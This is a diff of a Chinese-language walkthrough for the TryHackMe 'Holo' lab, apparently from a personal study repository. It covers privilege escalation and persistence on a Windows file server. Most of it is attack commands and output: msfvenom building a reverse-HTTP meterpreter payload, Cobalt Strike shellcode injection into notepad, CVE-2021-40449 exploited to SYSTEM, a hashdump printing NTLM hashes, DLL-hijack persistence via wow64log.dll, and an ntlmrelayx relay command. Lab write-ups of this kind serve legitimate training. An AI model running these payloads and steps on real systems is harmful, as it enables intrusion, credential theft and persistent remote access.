@@ -1610,63 +1610,199 @@ c:\Windows\Tasks>
 
 ## 提权
 
+在用户文件夹有一个kavremover可执行文件
+```
+beacon> ls C:\Users\watamet\Applications
+[*] Tasked beacon to list files in C:\Users\watamet\Applications
+[+] host called home, sent: 47 bytes
+[*] Listing: C:\Users\watamet\Applications\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+ 4mb      fil     12/10/2020 23:34:51   kavremover.exe
+```
+
+官方说是从这个程序缺失的dll来执行提权
+
+但是从官方描述中我没看明白是从哪里的枚举知道可以用这个程序缺失的dll文件提权的
+
 在这里我决定使用msf自动提权枚举工具
 
 从CS传递一个session给msf
 
 ## session passing
 
-1. 首先在metasploit起一个监听，需要使用```windows/meterpreter/reverse_http```payload (只支持x86 Meterpreter)
-
+1. msf生成payload（支持x64)
 ```
-msf6 > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
-payload => windows/meterpreter/reverse_http
-msf6 exploit(multi/handler) > set lhost tun0
-lhost => tun0
-msf6 exploit(multi/handler) > set LPORT 8080
-LPORT => 8080
+┌──(root㉿kali)-[~/tryhackme/holo]
+└─# msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.50.111.108 LPORT=4242 -f raw -o /root/CobaltStrike/payload/msf.bin
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 201308 bytes
+Saved as: /root/CobaltStrike/payload/msf.bin
+```
+
+
+2. 注入进程，这里选择记事本（notepad.exe）
+```
+beacon> execute C:\Windows\System32\notepad.exe
+beacon> ps
+
+ PID   PPID  Name                         Arch  Session     User
+ ---   ----  ----                         ----  -------     -----              
+ 1072  4792  notepad.exe                  x64   2           HOLOLIVE\watamet
+
+beacon> shinject 1072 x64 payload\msf.bin
+```
+
+3. msf收到rev shell
+```
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter_reverse_http):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   EXTENSIONS                   no        Comma-separate list of extensions to load
+   EXTINIT                      no        Initialization strings for extensions
+   LHOST       tun0             yes       The local listener hostname
+   LPORT       4242             yes       The local listener port
+   LURI                         no        The HTTP Path
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
 msf6 exploit(multi/handler) > run
-[*] Started HTTP reverse handler on http://10.50.111.108:8080
 
-```
-
-2. CS建立一个监听
-
-![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659693714992.jpg)
-
-3. CS使用spawn命令传session到msf
-
-```
-beacon> spawn holo-Foreign-HTTP-msf-8080
-[*] Tasked beacon to spawn (x86) windows/foreign/reverse_http (10.50.111.108:8080)
-[+] host called home, sent: 806 bytes
-```
-
-4. msf收到传过来的session
-
-```
-msf6 exploit(multi/handler) > run
-
-[*] Started HTTP reverse handler on http://10.50.111.108:8080
-[!] http://10.50.111.108:8080 handling request from 10.200.114.35; (UUID: oas3wlq2) Without a database connected that payload UUID tracking will not work!
-[*] http://10.50.111.108:8080 handling request from 10.200.114.35; (UUID: oas3wlq2) Staging x86 payload (176220 bytes) ...
-[!] http://10.50.111.108:8080 handling request from 10.200.114.35; (UUID: oas3wlq2) Without a database connected that payload UUID tracking will not work!
-[*] Meterpreter session 1 opened (10.50.111.108:8080 -> 127.0.0.1) at 2022-08-05 06:04:28 -0400
+[*] Started HTTP reverse handler on http://10.50.111.108:4242
+[!] http://10.50.111.108:4242 handling request from 10.200.114.35; (UUID: zdmd8wyn) Without a database connected that payload UUID tracking will not work!
+[*] http://10.50.111.108:4242 handling request from 10.200.114.35; (UUID: zdmd8wyn) Redirecting stageless connection from /A5BQvMdAwA5-V39VHLlKzgCQmoCNNwOLQeRnnz78sVYzN-uQk1of4-NsQVO5t8-PMHKdmkqp8UQlZ with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
+[!] http://10.50.111.108:4242 handling request from 10.200.114.35; (UUID: zdmd8wyn) Without a database connected that payload UUID tracking will not work!
+[*] http://10.50.111.108:4242 handling request from 10.200.114.35; (UUID: zdmd8wyn) Attaching orphaned/stageless session...
+[!] http://10.50.111.108:4242 handling request from 10.200.114.35; (UUID: zdmd8wyn) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 3 opened (10.50.111.108:4242 -> 127.0.0.1 ) at 2022-08-06 05:30:12 -0400
 
 meterpreter > getuid
 Server username: HOLOLIVE\watamet
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface  6
+============
+Name         : AWS PV Network Device #0
+Hardware MAC : 02:94:8e:24:ab:23
+MTU          : 9001
+IPv4 Address : 10.200.114.35
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::5c88:e884:e5fe:5fa
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+meterpreter > 
 
 ```
 
 ## 提权枚举
 
+使用```post/multi/recon/local_exploit_suggester```自动枚举模块
+
+```
 msf6 post(multi/recon/local_exploit_suggester) > run
 
-[*] 10.200.114.35 - Collecting local exploits for x86/windows...
-[*] 10.200.114.35 - 40 exploit checks are being tried...
+[*] 10.200.114.35 - Collecting local exploits for x64/windows...
+[*] 10.200.114.35 - 32 exploit checks are being tried...
 [+] 10.200.114.35 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
 [+] 10.200.114.35 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
-[+] 10.200.114.35 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[+] 10.200.114.35 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows 10 v1809 build was detected!
+[+] 10.200.114.35 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
+[+] 10.200.114.35 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
 [*] Post module execution completed
+
+```
+
+使用```exploit/windows/local/cve_2021_40449```模块提权到system
+
+```
+msf6 exploit(windows/local/cve_2021_40449) > run
+
+[*] Started reverse TCP handler on 10.50.111.108:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Target's build number: 10.0.17763.1577
+[+] The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
+[*] Launching msiexec to host the DLL...
+[+] Process 5092 launched.
+[*] Reflectively injecting the DLL into 5092...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (200262 bytes) to 10.200.114.35
+[*] Meterpreter session 4 opened (10.50.111.108:4444 -> 10.200.114.35:52297 ) at 2022-08-06 05:44:38 -0400
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+```
+
+hashdump
+```
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:947722a39b2fc20c72c0d7626cf147b8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+meterpreter >
+```
+
+**Task 43  Privilege Escalation WERE TAKING OVER THIS DLL!**
+
+> What is the name of the vulnerable application found on PC-FILESRV01?
+
+> kavremover
+
+
+## 主机持久性
+根据lab指引,第一个缺失的dll文件应该是：```wow64log.dll```
+
+![img](https://i.imgur.com/8xu1QAf.png)
+
+**Task 44  Persistence WERE TAKING OVER THIS DLL! Part: II**
+
+> What is the first listed vulnerable DLL located in the Windows folder from the application
+
+> wow64log.dll
+
+这里主要是通过劫持系统软件缺失的dll文件来执行恶意代码，这样每当重启系统或者重启软件时我们都能获得一个rev shell，从而获得持久性
+但是上面我们已经有了administrator的哈希，理论上也可以实现主机持久性，当然如果管理员改了密码那就不行了
+
+
+
+## NTLM Relay
+
+nmap -sT -p 445 -A 10.200.114.0/24
+nmap -sT -p 445 -A 10.200.114.0/24
+
+
+filesrv01
+
+
+/usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.114.30 -smb2support -socks 
